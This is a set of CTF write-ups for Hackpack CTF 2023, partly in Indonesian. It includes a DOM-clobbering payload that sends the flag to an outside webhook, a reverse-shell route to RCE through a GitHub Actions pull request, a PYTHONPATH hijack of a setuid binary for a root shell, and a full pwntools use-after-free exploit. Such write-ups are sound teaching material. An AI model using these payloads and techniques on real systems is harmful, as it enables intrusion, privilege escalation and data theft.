Wiki world - web
===
## Description

Can you alpha test out our newest note-taking [website](https://wikiworld.cha.hackpack.club/)? (If you find anything, please report it to us using  `nc cha.hackpack.club 8702`)

Also unrelatedly, our website admin is really fond of the wiki-world extension, he uses it all the time, even on his work computer.

I should probably get him to stop using it tho, it hasn't been approved by IT yet.

Author: Sohom (Sodium#8285)

NOTE: we recommend you try to develop a exploit locally using the provided source code before attempting the exploit on the challenge servers. Feel free to contact the admins if you have a exploit that works locally, but not on the challenge servers.

## Exploit

For this challenge, we have provided the source code, which can be downloaded at the following link:

:::info
https://drive.google.com/file/d/1H-wGeUFgk8jvBK3XO8NV55pzs1FEn7fy/view?usp=share_link
:::

The source code for the challenge reveals that the admin bot utilizes a custom web browser extension.

![](https://i.imgur.com/zUM8U2b.png)

![](https://i.imgur.com/sM2UErh.png)

After reviewing the extension's source code above as shown in image above, we discovered that it retrieves its configuration from the window object. This vulnerability can be exploited using a technique called DOM clobbering, which is described in detail at the following URL:

:::info
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering
:::

By utilizing this technique, we were able to change the value of window.config and manipulate the behavior of the extension.

The following payload can be used to exploit this vulnerability:

```html 
<a id=config><a id=config name=WIKI_REGEX href="BLOB:.*?(flag\{.*?\})"></a>
<a id=config><a id=config name=WIKIPEDIA_SERVER href="https://webhoo.site"></a>
```

This payload modifies the values of `config.WIKI_REGEX` and `config.WIKIPEDIA_SERVER` to match the flag and send it to the attacker's server.

Next, we return to the challenge web page and copy the payload into the text area, as shown in the image below:

![](https://i.imgur.com/6bhyR0b.png)

We retrieve the URL and paste it into the bot server as shown in the following image:

![](https://i.imgur.com/bsCsc2G.png)

![](https://i.imgur.com/D4y65hZ.png)

After that, we can see the flag in our webhook server:

![](https://i.imgur.com/CeD5qnE.png)

pully - web
===
## Description
Do you like open-source and want to work on it? Please check out our new project and contribute to it: https://github.com/hackpackctf/pully

Author: Igibek
Discord: kigibek

## Recon
![](https://i.imgur.com/EMUSc9Z.png)

We are given a GitHub repository with a GitHub action workflow. We can fork the repository and trigger the GitHub action by pulling the forked repository.

In the following build, we can see that the workflow will echo the flag, but it might not be the real flag because the workflow on the server could be different from the GitHub repository. At the bottom of the image, we can see that it uses the npm test command. We can gain RCE by uploading a test that contains a reverse shell.

![](https://i.imgur.com/qIO2XW8.png)

## Exploit
To exploit this challenge, we need to gain RCE by uploading a test containing a reverse shell, and then find the flag in the directories "/home/runner/work/*".

First, we fork the GitHub repository.

![](https://i.imgur.com/zme5mFt.png)

Then, we modify our fork to execute RCE.

![](https://i.imgur.com/TQX9r3V.png)

After that, we pull our forked repository to the main repository.

![](https://i.imgur.com/KfFvYoV.png)

Now we have a reverse shell from the server.

![](https://i.imgur.com/Mh1OJQw.png)

Now we need to execute the grep command to search for the keyword 'flag' recursively in directories. The grep command is a Unix tool used for searching through text or files for specific patterns. In this case, we are searching for the pattern 'flag' in directories. The output of the grep command contains the flag, which is shown in the image below.

![](https://i.imgur.com/JF4rUod.png)

ezila - misc (privilage escalation with setuid binary)
===
Kita bisa melakukan privilage escalation dengan merubah python environment dan membuat python meng-import package yang didalamnya terdapat payload kita.

echo 'def choice(foo):import os; os.execl("/bin/sh", "sh", "-p")' > /tmp/random.py && PYTHONPATH=/tmp ./run-ezila

number store - pwn
===

bugnya uaf, dengan itu kita bisa leak heap, untuk leak pie yang perlu dilakukan adalah buat chunk lalu delete agar masuk tcache setelah itu generate random number yang bakal nyimpen alamat fungsi generate random, setelah leak pake uaf, karena uafnya cuma bisa ganti 16 byte setelah alamat heap kita gabisa tcache poison tapi kita bisa ganti alamat generate random tadi pake alamat yang kita mau dan kalo kita panggil lagi kita manggil alamat yang kita ganti

```python
#!/usr/bin/env python3

from pwn import *

exe = 'chal'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('/usr/lib/libc.so.6', checksec=False)
context.log_level = 'debug'

cmd = '''
c
'''

if args.REMOTE:
    p = remote('cha.hackpack.club', 41705)
else:
    p = process()

### EXPLOIT HERE ###

def add_num(idx, name, num):
    p.sendlineafter(b': ', b'1')
    p.sendlineafter(b'(0-9): ', f'{idx}'.encode())
    p.sendlineafter(b'name:', name)
    p.sendlineafter(b'number:', num)

def del_num(idx):
    p.sendlineafter(b': ', b'2')
    p.sendlineafter(b'(0-9): ', f'{idx}'.encode())

def edit_num(idx, num):
    p.sendlineafter(b': ', b'3')
    p.sendlineafter(b'(0-9): ', f'{idx}'.encode())
    p.sendlineafter(b'number: ', f'{num}'.encode())

def show_num(idx):
    p.sendlineafter(b': ', b'4')
    p.sendlineafter(b'(0-9): ', f'{idx}'.encode())

def rand_num():
    p.sendlineafter(b': ', b'6')


add_num(0, b'a', b'1')
del_num(0)
# show_num(0)
# # heap leak
# heap = u64(p.recvline(0).ljust(8, b'\0'))
# heap = eval(hex(heap)+ '000')
# print(hex(heap))

rand_num()
show_num(0)
# pie leak
p.recvline(0)
pie = eval(p.recvline(0)) - 0x1257
info(hex(pie))

win = elf.symbols.printFlag + pie

edit_num(0, win)
rand_num()

# gdb.attach(p, cmd)

p.interactive()
```

Our team writeups
===

- daffainfo: https://github.com/daffainfo/ctf-writeup/tree/main/Hackpack%20CTF%202023

| Category | Challenge |
| --- | --- |
| Web | [HackerChat](/Hackpack%20CTF%202023/HackerChat/)
| Web | [WolfHowl](/Hackpack%20CTF%202023/WolfHowl/)
| Misc | [Welcome!](/Hackpack%20CTF%202023/Welcome!/)

- Maulvi Alfansuri: https://maulvialf.medium.com/reversing-webassembly-write-up-hackpack-2023-wasm-safe-6ca78e3f4ee3

| Category | Challenge |
| --- | --- |
| Rev | WASM-safe |